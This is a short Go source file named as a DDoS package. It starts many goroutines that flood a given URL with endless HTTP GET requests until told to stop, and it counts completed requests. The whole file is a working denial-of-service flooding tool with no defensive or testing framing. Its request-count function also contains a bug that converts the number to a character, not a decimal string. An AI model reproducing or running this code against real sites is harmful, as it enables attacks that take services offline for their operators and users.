package ddos

import (
	"io"
	"net/http"
	"runtime"
	"sync/atomic"
)

type DDos struct {
	ReqAmount      int64
	Url            string
	Exit           *chan bool
	completeAmount int64
}

func (d *DDos) Run() {
	var intAmount int = int(d.ReqAmount)

	for i := 0; i < intAmount; i++ {
		go func() {
			for {
				select {
				case <-*d.Exit:
					return
				default:
					resp, err := http.Get(d.Url)
					atomic.AddInt64(&d.completeAmount, 1)
					if err == nil {
						//clean RAM memory from body and close connection
						_, _ = io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
					}
				}
				// we explicitly say after each select is triggered that we need
				// to transfer the work to another goroutine
				runtime.Gosched()
			}
		}()
	}
}

func (d *DDos) Stop() {
	var intAmount int = int(d.ReqAmount)

	for i := 0; i < intAmount; i++ {
		*d.Exit <- true
	}

	close(*d.Exit)
}

func (d *DDos) CompleteAmount() string {
	var amount string = string(d.completeAmount)

	return amount
}
